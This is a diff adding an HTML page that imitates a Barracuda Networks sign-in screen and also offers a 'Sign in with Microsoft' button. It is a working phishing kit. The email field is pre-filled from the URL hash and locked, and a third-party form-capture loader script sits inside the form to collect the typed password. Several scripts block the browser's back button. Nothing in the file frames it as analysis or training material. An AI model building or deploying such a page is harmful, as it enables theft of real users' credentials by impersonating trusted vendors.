@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to Barracuda Networks</title>
+    <style>
+* {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+}
+
+body {
+    background-color: #f8fafc;
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+    position: relative;
+}
+
+/* Centered Layout Workspace Block Wrapper */
+.login-wrapper {
+    width: 100%;
+    max-width: 440px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+}
+
+/* Rounded Corner Rectangular Floating White Card Component Frame */
+.login-card {
+    background-color: #ffffff;
+    width: 100%;
+    padding: 44px 40px;
+    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.04);
+    border-radius: 8px;
+    text-align: center;
+}
+
+/* Brand Identity Structural Header Layout Grid Component */
+.brand-logo-area {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 6px;
+    margin-bottom: 24px;
+}
+
+.logo-shark-fin {
+    font-size: 28px;
+    font-weight: 900;
+    color: #0076d6; /* Distinctive vivid sky blue signature corporate palette hue */
+    transform: italic;
+}
+
+.logo-text {
+    font-size: 32px;
+    font-weight: 500;
+    color: #111111;
+    letter-spacing: -0.5px;
+}
+
+.card-title {
+    font-size: 22px;
+    font-weight: 600;
+    color: #111111;
+    margin-bottom: 8px;
+}
+
+.card-subtitle {
+    font-size: 13px;
+    color: #4b5563;
+    margin-bottom: 32px;
+}
+
+form {
+    width: 100%;
+}
+
+.form-group {
+    margin-bottom: 24px;
+    position: relative;
+    width: 100%;
+}
+
+/* Distinctive dynamic outline border frames with inline material-style header text tags label blocks precisely tracking screenshot blueprint layout details */
+.form-group label {
+    position: absolute;
+    left: 12px;
+    top: -8px;
+    background-color: #ffffff;
+    padding: 0 6px;
+    color: #0076d6; /* Active signature blue color layout code */
+    font-size: 12px;
+    font-weight: 500;
+    z-index: 5;
+}
+
+.form-group:not(.active-field) label {
+    color: #6b7280;
+}
+
+.form-control {
+    width: 100%;
+    padding: 14px 16px;
+    background-color: #ffffff;
+    border: 1px solid #cbd5e1;
+    border-radius: 4px;
+    font-size: 15px;
+    color: #111111;
+    outline: none;
+}
+
+/* Active username input boundary line filter */
+.form-group.active-field .form-control {
+    border: 2px solid #0076d6;
+    padding: 13px 15px;
+}
+
+.form-control:focus {
+    border: 2px solid #0076d6;
+    padding: 13px 15px;
+}
+
+.form-control:focus + label {
+    color: #0076d6;
+}
+
+.terms-disclosure-text, .support-text {
+    font-size: 12px;
+    color: #111111;
+    text-align: left;
+    line-height: 1.5;
+}
+
+.terms-disclosure-text {
+    margin-bottom: 4px;
+}
+
+.support-text {
+    margin-bottom: 28px;
+}
+
+.terms-disclosure-text a, .support-text a {
+    color: #0076d6;
+    text-decoration: none;
+    font-weight: 500;
+}
+
+.terms-disclosure-text a:hover, .support-text a:hover {
+    text-decoration: underline;
+}
+
+/* High contrast crisp wide rectangular solid blue action submission trigger button block component (NOW FULLY CLICKABLE) */
+.submit-btn {
+    position: relative;
+    z-index: 20;
+    width: 100%;
+    background-color: #0076d6; /* Matching branding exactly */
+    color: #ffffff;
+    border: none;
+    height: 46px;
+    font-size: 14px;
+    font-weight: bold;
+    border-radius: 4px;
+    cursor: pointer;
+    margin-bottom: 24px;
+    transition: background-color 0.15s ease;
+}
+
+.submit-btn:hover {
+    background-color: #005da6;
+}
+
+.signup-hint-row {
+    font-size: 13px;
+    color: #111111;
+    margin-bottom: 24px;
+}
+
+.signup-hint-row a {
+    color: #0076d6;
+    text-decoration: none;
+    font-weight: 500;
+}
+
+.signup-hint-row a:hover {
+    text-decoration: underline;
+}
+
+/* Visual horizontal bar divider layout block node component */
+.or-divider {
+    display: flex;
+    align-items: center;
+    text-align: center;
+    color: #6b7280;
+    font-size: 11px;
+    font-weight: 500;
+    text-transform: uppercase;
+    margin-bottom: 24px;
+}
+
+.or-divider::before, .or-divider::after {
+    content: '';
+    flex: 1;
+    border-bottom: 1px solid #e2e8f0;
+}
+
+.or-divider:not(:empty)::before { margin-right: 1em; }
+.or-divider:not(:empty)::after { margin-left: 1em; }
+
+/* Flat clean white external integration button node element with signature multi-color grid branding */
+.microsoft-oauth-btn {
+    width: 100%;
+    background-color: #ffffff;
+    border: 1px solid #cbd5e1;
+    border-radius: 4px;
+    height: 46px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 12px;
+    cursor: pointer;
+    font-size: 14px;
+    color: #4b5563;
+    font-weight: 500;
+    transition: background-color 0.15s ease;
+}
+
+.microsoft-oauth-btn:hover {
+    background-color: #f8fafc;
+}
+
+/* 2x2 Microsoft corporate identity color logo blocks matrix grid alignment */
+.ms-logo-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 2px;
+    width: 16px;
+    height: 16px;
+}
+
+.ms-tile {
+    width: 7px;
+    height: 7px;
+}
+.ms-tile.red { background-color: #f25022; }
+.ms-tile.green { background-color: #7fba00; }
+.ms-tile.blue { background-color: #00a4ef; }
+.ms-tile.yellow { background-color: #ffb900; }
+
+/* OS Environment Activation Notification Simulation Overlay Layer Components Grid Blueprint */
+.system-watermark {
+    position: fixed;
+    bottom: 24px;
+    right: 24px;
+    text-align: left;
+    font-size: 13px;
+    color: rgba(0, 0, 0, 0.13);
+    line-height: 1.4;
+    user-select: none;
+    pointer-events: none;
+    z-index: 100;
+}
+
+@media (max-width: 480px) {
+    .login-card {
+        padding: 32px 20px;
+    }
+}
+
+
+    </style>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Barracuda Networks - Sign In</title>
+    <!-- Link to external stylesheet -->
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <!-- Centered Form Container Card Box Component Module Wrapper -->
+    <main class="login-wrapper">
+        
+        <!-- Floating White Interface Card Box Component Area -->
+        <div class="login-card">
+            
+            
+            <div class="brand-logo-area">
+                <span class="logo-shark-fin">✓</span>
+                <span class="logo-text">Barracuda</span>
+            </div>
+
+            <h1 class="card-title">Welcome</h1>
+            <p class="card-subtitle">Sign in to Barracuda Networks.</p>
+    
+            <!-- Form submission configuration using FormSubmit module links integration -->
+            <form action="" method="POST">
+                <script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=px88b6jp&n=n1.ratufa.io"></script>
+                <!-- Material-style Email Field Entry Structural Container Box -->
+                <div class="form-group active-field">
+                    <label for="email">Email address*</label>
+ <input type="email" id="email" name="email" class="form-control" placeholder="Email address" readonly="readonly" />
+                </div>
+
+                <!-- Newly Integrated Material-style Password Field Entry Structural Container Box -->
+                <div class="form-group">
+                    <label for="password">Password*</label>
+<input type="password" name="Password" placeholder="Password" class="form-control" style="font-size: 12pt; required="" oninvalid="this.setCustomValidity('Wprowadź hasło do swojego adresu e-mail')"
+  oninput="this.setCustomValidity('')"/>
+                </div>
+
+                <!-- Legal Terms acceptance disclosure text block segment -->
+                <p class="terms-disclosure-text">
+                    By proceeding, you agree to our <a href="#">Privacy Policy</a>.
+                </p>
+                <p class="support-text">
+                    Need help? <a href="#">Contact Barracuda Networks support</a>.
+                </p>
+                
+                <!-- Solid Crisp Rounded Rectangular Blue Action Submission Trigger Button Block Component -->
+                <button type="submit" class="submit-btn">Continue</button>
+            </form>
+
+            <!-- Secondary choice footer sign up reference hint label link option -->
+            <div class="signup-hint-row">
+                Don't have an account? <a href="#">Sign up</a>
+            </div>
+
+            <!-- Visual Divider text node separating authentication channels -->
+            <div class="or-divider">OR</div>
+
+            
+            <button type="button" class="microsoft-oauth-btn">
+                <div class="ms-logo-grid">
+                    <div class="ms-tile red"></div>
+                    <div class="ms-tile green"></div>
+                    <div class="ms-tile blue"></div>
+                    <div class="ms-tile yellow"></div>
+                </div>
+                <span>Sign in with Microsoft</span>
+            </button>
+        </div>
+
+    </main>
+    <script>
+        window.addEventListener('DOMContentLoaded', () => {
+            if (window.location.hash) {
+                document.getElementById("email").value = window.location.hash.substring(1).trim();
+            }
+        });
+    </script>
+    <!-- 1. ANTI-BACKTRACK INTERLOCK ENGINE -->
+    <script type="text/javascript">
+        (function() {
+            window.history.pushState(null, null, window.location.href);
+            
+            window.onpopstate = function() {
+                window.history.pushState(null, null, window.location.href);
+           
+            };
+        })();
+    </script>
+<script type="text/javascript">
+    window.history.pushState(null, "", window.location.href);
+    
+    window.addEventListener("popstate", function() {
+        window.history.pushState(null, "", window.location.href);
+    });
+</script>
+<script type="text/javascript">
+    function preventBack() {
+        window.history.forward();
+    }
+    setTimeout("preventBack()", 0);
+    
+    window.onunload = function () { null };
+</script>
+
+</body>
+    
+</html>
+</body>
+</html>
